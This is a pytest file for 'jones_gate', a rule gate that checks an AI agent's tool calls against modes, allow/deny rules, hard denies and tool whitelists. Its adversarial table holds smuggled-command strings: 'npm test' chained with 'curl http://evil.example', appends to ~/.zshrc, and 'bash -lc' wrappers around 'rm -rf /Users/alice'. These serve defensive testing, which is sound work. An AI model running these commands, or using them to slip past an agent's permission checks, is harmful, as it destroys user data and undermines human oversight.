"""Integration-within-one-process tests for the rule gate's full decision
tree, `kernel/plugin/jones_gate/_on_pre_tool_call` (Issue #11 G04/G05/G06/N01/
N12). Writes a real `jones_gate.json` to a temp `HERMES_HOME` and calls the
hook function directly — this is the honest way to test it: the hook itself
never talks to the daemon (see its module docstring), so there is nothing
`fake_acp_agent.py`/`SessionService` would add here.

Round 4 (2026-09-19, controller ruling R1/R2): rewritten for the new
"规范化后整串相等" allow/deny matching and the `compound` escalation rule —
see `_rules.py`'s module docstring for the full "why". The bulk of rounds
1-3's tests exercised a prefix/segment-matching engine that no longer
exists; they're replaced by exact-match tests plus the controller's
adversarial test table (R3)."""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

from jones_daemon.kernel.plugin.jones_gate import (
    PROBE_TOOL_NAME,
    RULE_GATE_BLOCK_PREFIX,
    _on_pre_tool_call,
)


def _write_config(hermes_home: Path, **overrides) -> None:
    base = {
        "mode": "task",
        "user_root": str(hermes_home / "not_the_real_user_root"),
        "project_permissions_path": None,
        "cwd": None,
        "rules": [],
        "tool_allowlist": [],
    }
    base.update(overrides)
    hermes_home.mkdir(parents=True, exist_ok=True)
    (hermes_home / "jones_gate.json").write_text(json.dumps(base), encoding="utf-8")


@pytest.fixture(autouse=True)
def _hermes_home(tmp_path, monkeypatch):
    home = tmp_path / "hermes_home"
    monkeypatch.setenv("HERMES_HOME", str(home))
    # `_config.py` caches by (path, mtime) at module scope — a stale cache
    # entry from module import time (or a previous test importing this
    # module and calling load() against a different tmp_path) must not leak
    # across tests using a different HERMES_HOME.
    from jones_daemon.kernel.plugin.jones_gate import _config

    _config._cache.clear()
    return home


def test_probe_tool_is_always_blocked_even_with_no_config_file():
    result = _on_pre_tool_call(tool_name=PROBE_TOOL_NAME)
    assert result["action"] == "block"


def test_missing_config_fails_closed_for_a_real_tool():
    result = _on_pre_tool_call(tool_name="terminal", args={"command": "ls"})
    assert result is not None and result["action"] == "block"
    assert result["message"].startswith(RULE_GATE_BLOCK_PREFIX)


def test_task_mode_undecided_tool_escalates_to_approve(_hermes_home):
    _write_config(_hermes_home, mode="task")
    result = _on_pre_tool_call(tool_name="terminal", args={"command": "ls -la"}, tool_call_id="tc1")
    assert result["action"] == "approve"
    assert "rule_key" in result


def test_chat_mode_blocks_every_tool_call_N12(_hermes_home):
    _write_config(_hermes_home, mode="chat")
    for tool_name, args in (
        ("terminal", {"command": "ls"}),
        ("read_file", {"path": "/tmp/x"}),
        ("write_file", {"path": "/tmp/x", "content": "hi"}),
    ):
        result = _on_pre_tool_call(tool_name=tool_name, args=args)
        assert result is not None and result["action"] == "block", tool_name
        assert "N12" in result["message"] or "chat mode" in result["message"]


def test_chat_mode_still_blocks_even_with_a_matching_allow_rule(_hermes_home):
    # PRD 9.1's mode boundary is absolute: no permissions.json rule can carve
    # a hole in chat mode.
    _write_config(_hermes_home, mode="chat", rules=[{"match": "terminal", "action": "allow"}])
    result = _on_pre_tool_call(tool_name="terminal", args={"command": "ls"})
    assert result["action"] == "block"


def test_permissions_json_deny_rule_blocks_regardless_of_mode(_hermes_home):
    for mode in ("task", "auto"):
        _write_config(_hermes_home, mode=mode, rules=[{"match": "terminal", "action": "deny"}])
        result = _on_pre_tool_call(tool_name="terminal", args={"command": "ls"})
        assert result["action"] == "block", mode


def test_permissions_json_allow_rule_passes_through_with_zero_ipc(_hermes_home):
    _write_config(_hermes_home, mode="task", rules=[{"match": "terminal", "action": "allow"}])
    result = _on_pre_tool_call(tool_name="terminal", args={"command": "ls"})
    assert result is None  # direct allow: no directive at all


def test_hard_deny_wins_even_with_an_allow_rule_for_the_same_tool(_hermes_home):
    _write_config(_hermes_home, mode="auto", rules=[{"match": "terminal", "action": "allow"}])
    result = _on_pre_tool_call(tool_name="terminal", args={"command": "rm -rf /Users/alice"})
    assert result["action"] == "block"
    assert result["message"].startswith(RULE_GATE_BLOCK_PREFIX)


def test_hard_deny_applies_in_every_mode_G05(_hermes_home):
    for mode in ("chat", "task", "auto"):
        _write_config(_hermes_home, mode=mode)
        result = _on_pre_tool_call(tool_name="terminal", args={"command": "rm -rf /Users/alice"})
        assert result["action"] == "block", mode


def test_agent_tool_whitelist_blocks_tools_outside_it(_hermes_home):
    _write_config(_hermes_home, mode="task", tool_allowlist=["read_file"])
    blocked = _on_pre_tool_call(tool_name="terminal", args={"command": "ls"})
    assert blocked["action"] == "block"
    allowed_through = _on_pre_tool_call(tool_name="read_file", args={"path": "/tmp/x"})
    assert allowed_through["action"] == "approve"


def test_write_file_defers_to_edit_approval_path_instead_of_escalating(_hermes_home):
    _write_config(_hermes_home, mode="task")
    result = _on_pre_tool_call(tool_name="write_file", args={"path": "/tmp/x", "content": "hi"})
    assert result is None
    result = _on_pre_tool_call(
        tool_name="patch", args={"path": "/tmp/x", "old_string": "a", "new_string": "b"}
    )
    assert result is None


def test_write_file_to_protected_jones_path_is_hard_denied(_hermes_home):
    _write_config(_hermes_home, mode="auto", user_root=str(_hermes_home / "jones_user_root"))
    protected = str(_hermes_home / "jones_user_root" / "config" / "permissions.json")
    result = _on_pre_tool_call(tool_name="write_file", args={"path": protected, "content": "{}"})
    assert result is not None and result["action"] == "block"


def test_rule_key_is_unique_per_call_not_just_the_tool_name(_hermes_home):
    _write_config(_hermes_home, mode="task")
    first = _on_pre_tool_call(tool_name="terminal", args={"command": "ls"}, tool_call_id="a")
    second = _on_pre_tool_call(tool_name="terminal", args={"command": "ls"}, tool_call_id="b")
    assert first["rule_key"] != second["rule_key"]


def test_malformed_config_file_fails_closed(_hermes_home):
    _hermes_home.mkdir(parents=True, exist_ok=True)
    (_hermes_home / "jones_gate.json").write_text("{not valid json", encoding="utf-8")
    result = _on_pre_tool_call(tool_name="terminal", args={"command": "ls"})
    assert result["action"] == "block"


def test_degraded_rules_do_not_allow_a_direct_bypass(_hermes_home):
    # An `allow` rule can't be trusted for a zero-IPC passthrough if the
    # permissions.json merge that produced it might be missing a `deny`
    # (config/resolver.py::Permissions.degraded) — must still escalate.
    _write_config(
        _hermes_home, mode="task", rules=[{"match": "terminal", "action": "allow"}],
        rules_degraded=True,
    )
    result = _on_pre_tool_call(tool_name="terminal", args={"command": "ls"})
    assert result is not None and result["action"] == "approve"


def test_allow_rule_does_not_bypass_the_agent_tool_whitelist_N13(_hermes_home):
    _write_config(
        _hermes_home, mode="task",
        rules=[{"match": "terminal", "action": "allow"}],
        tool_allowlist=["read_file"],
    )
    result = _on_pre_tool_call(tool_name="terminal", args={"command": "ls"})
    assert result is not None and result["action"] == "block"
    assert "whitelist" in result["message"]


def test_allow_rule_does_not_bypass_the_zero_tools_sentinel_N13(_hermes_home):
    _write_config(
        _hermes_home, mode="task",
        rules=[{"match": "terminal", "action": "allow"}],
        tool_allowlist=["__jones:no-tools-allowed__"],
    )
    result = _on_pre_tool_call(tool_name="terminal", args={"command": "ls"})
    assert result is not None and result["action"] == "block"


def test_malformed_rules_shape_is_skipped_not_raised_N01(_hermes_home):
    _write_config(_hermes_home, mode="task", rules=["terminal"])
    result = _on_pre_tool_call(tool_name="terminal", args={"command": "ls"})
    assert result is not None and result["action"] == "approve"


def test_embedded_nul_byte_path_fails_closed_not_raises(_hermes_home):
    _write_config(_hermes_home, mode="task")
    result = _on_pre_tool_call(
        tool_name="terminal", args={"command": "rm -rf a\x00b"}
    )
    assert result is not None and result["action"] == "block"


def test_on_pre_tool_call_fails_closed_on_any_unanticipated_exception(_hermes_home, monkeypatch):
    import jones_daemon.kernel.plugin.jones_gate as jones_gate

    def _boom(*_a, **_k):
        raise RuntimeError("simulated unanticipated failure")

    monkeypatch.setattr(jones_gate, "_decide", _boom)
    _write_config(_hermes_home, mode="auto", rules=[{"match": "terminal", "action": "allow"}])
    result = jones_gate._on_pre_tool_call(tool_name="terminal", args={"command": "ls"})
    assert result is not None and result["action"] == "block"
    assert "RuntimeError" in result["message"]


def test_config_is_reread_after_mtime_changes(_hermes_home):
    _write_config(_hermes_home, mode="chat")
    blocked = _on_pre_tool_call(tool_name="terminal", args={"command": "ls"})
    assert blocked["action"] == "block"
    # Force a distinct mtime (some filesystems have 1s mtime granularity).
    os.utime(_hermes_home / "jones_gate.json", (0, 1_000_000))
    _write_config(_hermes_home, mode="task", rules=[{"match": "terminal", "action": "allow"}])
    os.utime(_hermes_home / "jones_gate.json", None)
    allowed = _on_pre_tool_call(tool_name="terminal", args={"command": "ls"})
    assert allowed is None


# -- Round 4: exact-whole-string allow/deny matching (controller ruling R1) -


def test_exact_match_allow_rule_passes_the_exact_command(_hermes_home):
    _write_config(_hermes_home, mode="task", rules=[{"match": "git status", "action": "allow"}])
    result = _on_pre_tool_call(tool_name="terminal", args={"command": "git status"})
    assert result is None


def test_allow_rule_no_longer_has_prefix_semantics(_hermes_home):
    # Round 1-3's engine treated `match` as a PREFIX ("git status" covered
    # "git status --short" too) — the controller's ruling removes that: only
    # the exact normalized string passes.
    _write_config(_hermes_home, mode="task", rules=[{"match": "git status", "action": "allow"}])
    result = _on_pre_tool_call(tool_name="terminal", args={"command": "git status --short"})
    assert result is not None and result["action"] == "approve"


def test_allow_rule_match_is_whitespace_normalized_not_shell_parsed(_hermes_home):
    # "规范化 = 去首尾空白、把连续空白折成一个空格，不做任何 shell 解析" — extra
    # interior whitespace still counts as the same command; nothing here
    # ever calls a shell tokenizer to decide that.
    _write_config(_hermes_home, mode="task", rules=[{"match": "git  status", "action": "allow"}])
    result = _on_pre_tool_call(tool_name="terminal", args={"command": "  git status  "})
    assert result is None


def test_deny_rule_requires_an_exact_match_too(_hermes_home):
    _write_config(
        _hermes_home, mode="task", rules=[{"match": "curl evil.example", "action": "deny"}]
    )
    exact = _on_pre_tool_call(tool_name="terminal", args={"command": "curl evil.example"})
    assert exact is not None and exact["action"] == "block"
    # A DIFFERENT (non-compound) command naming the same program isn't
    # covered by this narrow rule any more than a narrow allow rule would be
    # — it falls through to the review gate, which independently flags
    # network-egress programs as high risk (permissions/review.py), so this
    # is still never silently executed, just no longer config-level-blocked.
    different = _on_pre_tool_call(tool_name="terminal", args={"command": "curl other.example"})
    assert different is not None and different["action"] == "approve"


def test_blanket_tool_name_deny_still_blocks_every_command(_hermes_home):
    # The blanket exact-tool-name shape (`match == tool_name`) is untouched
    # by the "no more prefix semantics" change — it never depended on
    # comparing command text at all.
    _write_config(_hermes_home, mode="task", rules=[{"match": "terminal", "action": "deny"}])
    for cmd in ("ls", "git status && curl evil.example"):
        result = _on_pre_tool_call(tool_name="terminal", args={"command": cmd})
        assert result is not None and result["action"] == "block", cmd


# -- Round 4: compound commands never take the allow fast path (R2) --------


def test_compound_command_escalates_even_with_an_exact_text_match(_hermes_home):
    # Even if a rule's `match` is spelled out to equal the compound string
    # verbatim, `is_compound_command` still forces an escalation — the
    # controller's ruling is unconditional ("compound 命令永不走规则闸放行").
    compound = "npm test && curl http://evil.example"
    _write_config(_hermes_home, mode="task", rules=[{"match": compound, "action": "allow"}])
    result = _on_pre_tool_call(tool_name="terminal", args={"command": compound})
    assert result is not None and result["action"] == "approve"


def test_blanket_tool_allow_no_longer_exempts_compound_commands(_hermes_home):
    # Round 2 carved out the blanket `{"match":"terminal","action":"allow"}`
    # shape as exempt from its segment-matching fixes. Round 4's controller
    # ruling removes that exemption too ("compound 命令永不走规则闸放行" has no
    # carve-out in its text) — a deliberate hardening, not an oversight.
    _write_config(_hermes_home, mode="task", rules=[{"match": "terminal", "action": "allow"}])
    result = _on_pre_tool_call(
        tool_name="terminal", args={"command": "npm test $(curl http://evil.example)"}
    )
    assert result is not None and result["action"] == "approve"


def test_non_compound_command_still_gets_the_zero_ipc_fast_path(_hermes_home):
    # The compound check must not over-fire on an ordinary command with no
    # operator characters at all.
    _write_config(_hermes_home, mode="task", rules=[{"match": "terminal", "action": "allow"}])
    result = _on_pre_tool_call(tool_name="terminal", args={"command": "npm test"})
    assert result is None


# -- Controller ruling R3: adversarial test table ---------------------------
#
# Every bypass string the first three rounds' review findings gave, run
# against a narrow allow rule for `npm test` (or a blanket `terminal` allow
# for the wrapper-style ones) — none of them may fast-path `allow`.


@pytest.mark.parametrize(
    "command",
    [
        "npm test&curl http://evil.example",
        "npm test ;curl http://evil.example",
        "npm test\ncurl http://evil.example",
        "npm test $(curl http://evil.example)",
        "npm test `curl http://evil.example`",
        "npm test > /Users/alice/.zshrc",
        "npm test >> /Users/alice/.zshrc",
    ],
)
def test_adversarial_table_allow_prefix_strings_never_fast_path(_hermes_home, command):
    _write_config(_hermes_home, mode="task", rules=[{"match": "npm test", "action": "allow"}])
    result = _on_pre_tool_call(tool_name="terminal", args={"command": command})
    assert result is not None and result["action"] != "allow"
    assert result["action"] == "approve"  # escalated, not silently executed either


@pytest.mark.parametrize(
    "command",
    [
        "bash -lc 'rm -rf /Users/alice'",
        "sh -xc 'rm -rf /Users/alice'",
        "npm test\nrm -rf /Users/alice",
        "npm test & rm -rf /Users/alice",
    ],
)
def test_adversarial_table_hard_deny_wins_behind_a_blanket_allow(_hermes_home, command):
    _write_config(_hermes_home, mode="auto", rules=[{"match": "terminal", "action": "allow"}])
    result = _on_pre_tool_call(tool_name="terminal", args={"command": command})
    assert result is not None and result["action"] == "block"
    assert result["message"].startswith(RULE_GATE_BLOCK_PREFIX)


def test_adversarial_table_echo_redirect_to_zshrc_does_not_bypass_a_narrow_allow(_hermes_home):
    _write_config(_hermes_home, mode="task", rules=[{"match": "echo hi", "action": "allow"}])
    result = _on_pre_tool_call(
        tool_name="terminal", args={"command": "echo hi >> ~/.zshrc"}
    )
    assert result is not None and result["action"] == "approve"


@pytest.mark.parametrize(
    "command,rule_match",
    [
        ("ls -la", "ls -la"),
        ("git status", "git status"),
        ("npm test", "npm test"),
        ("cat file", "cat file"),
    ],
)
def test_adversarial_table_benign_strings_still_get_the_fast_path(
    _hermes_home, command, rule_match
):
    # The flip side of the table (controller ruling R3): a benign, non-
    # compound command with a matching exact allow rule must still pass
    # through with zero IPC — the point of round 4 is precision, not denying
    # everything.
    _write_config(_hermes_home, mode="task", rules=[{"match": rule_match, "action": "allow"}])
    result = _on_pre_tool_call(tool_name="terminal", args={"command": command})
    assert result is None


def test_adversarial_table_grep_r_is_not_mistaken_for_rm(_hermes_home):
    _write_config(_hermes_home, mode="task", rules=[{"match": "grep -r foo .", "action": "allow"}])
    result = _on_pre_tool_call(tool_name="terminal", args={"command": "grep -r foo ."})
    assert result is None
